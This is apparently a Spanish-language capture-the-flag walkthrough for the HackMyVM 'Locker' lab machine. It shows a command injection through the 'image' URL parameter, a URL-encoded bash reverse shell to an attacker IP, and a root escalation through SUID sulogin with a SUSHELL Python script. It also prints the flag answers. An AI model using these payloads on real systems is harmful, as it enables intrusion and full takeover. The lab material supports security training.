---
icon: flag
---

# Locker HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 03:47 EDT
Nmap scan report for 192.168.5.11
Host is up (0.0014s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:4A:3E:24 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```

Veremos que solo tenemos un puerto `80`, si entramos dentro veremos una pagina web normal que pone lo siguiente:

<figure><img src="../../.gitbook/assets/image (378).png" alt=""><figcaption></figcaption></figure>

No vemos nada interesante, por lo que vamos a clickar en `Model 1` a ver que nos encontramos, echo eso veremos lo siguiente en la pagina:

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Pero sobre todo es muy interesante la `URL` ya que esta utilizando `PHP` y llamando mediante un parametro `image` a un numero que se identifica como a la imagen, por lo que vamos a realizar varias pruebas de vulenrabilidades sobre dicho parametro no vaya a ser que se pudiera injectar comandos.

## Escalate user www-data

Realizando varias pruebas despues de estar un rato, vemos que concatenando comandos nos funciona, si abrimos `BurpSuite` y capturamos la peticion, lo mandamos al `Repeater` y realizamos ahi las pruebas, veremos que si ponemos lo siguiente podremos realizar un `RCE`.

```
URL = http://<IP>/locker.php?image=1;id;
```

Probando a poner `id` solamente, despues concatenandolo, tampoco funcionaba, pero si le pones un `;` extra detras, ya si que funciona y veremos lo siguiente en la peticion de respuesta:

```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sat, 10 May 2025 07:57:48 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Length: 112

<img src="data:image/jpg;base64,uid=33(www-data) gid=33(www-data) groups=33(www-data)
"width="150"height="150"/>
```

Vemos que nos esta funcionando, por lo que vamos a generar una `reverse shell` de esta forma:

```
URL = http://<IP>/locker.php?image=1;bash+%20-c+%20"bash+%20-i+%20>%26+%20/dev/tcp/<IP_ATTACKER>/<PORT>+%200>%261";
```

Ahora nos pondremos a la escucha antes de enviarlo.

```shell
nc -lvnp <PORT>
```

Si enviamos la peticion y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.11] 54772
bash: cannot set terminal process group (362): Inappropriate ioctl for device
bash: no job control in this shell
www-data@locker:~/html$ whoami
whoami
www-data
```

Veremos que hemos obtenido acceso como el usuario `www-data` por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Una vez sanitizado todo, vamos a leer la `flag` del usuario.

## Escalate Privileges

Si listamos los permisos `SUID` que tenemos con dicho usuario, veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
15884    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
     4639     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   137057     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
     3596     48 -rwsr-sr-x   1 root     root          47184 Jan 10  2019 /usr/sbin/sulogin
     3890     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
       62     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
     3415     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
       59     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
       60     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
       63     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
     3888     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
     3562     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
```

Vemos uno bastante interesante, que es el siguiente:

```
3596   48 -rwsr-sr-x   1 root   root   47184 Jan 10  2019 /usr/sbin/sulogin
```

Vamos a investigar que hace dicho binario.

Si investigamos un poco cuando se ejecuta el binario entramos en un `interpreter` en el que podemos ejecutar comandos, pero al tener esta `shell` dentro de un contenedor de la maquina victima no va a funcionar a parte de que esta como bloqueado, pero si investigamos con el parametro `-e` podemos forzar esa ejecuccion y tendremos que exportar la variable de entorno `SUSHELL` para poner el script que queremos que ejecute para poder obtener acceso a `root`, por lo que haremos lo siguiente:

```shell
cd /tmp
```

> bash.py

```python
#!/bin/python3

import os

os.setuid(0)
os.setgid(0)
print("Obteniendo Bash como root...")

os.system('/bin/bash')

print("Ya eres root!!")
```

Lo guardamos y establecemos permisos de ejecuccion:

```shell
chmod +x bash.py
```

Echo esto tendremos que exportar la variable de entorno a la de la ruta de `/tmp` con el script de `python`.

```shell
export SUSHELL=/tmp/bash.py
```

Echo esto, podremos ejecutar el `binario` con permisos de `SUID` pero haciendolo de una manera forzada con el parametro `-e`.

```shell
/usr/sbin/sulogin -e
```

Info:

```
Press Enter for maintenance
(or press Control-D to continue): # Dejamos el campo vacio y le damos a "ENTER"
Obteniendo Bash como root...
root@locker:~# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos las `2` `flags` la del usuario y la de `root`.

> user.txt

```
flaglockeryes
```

> root.txt

```
igotroothere
```
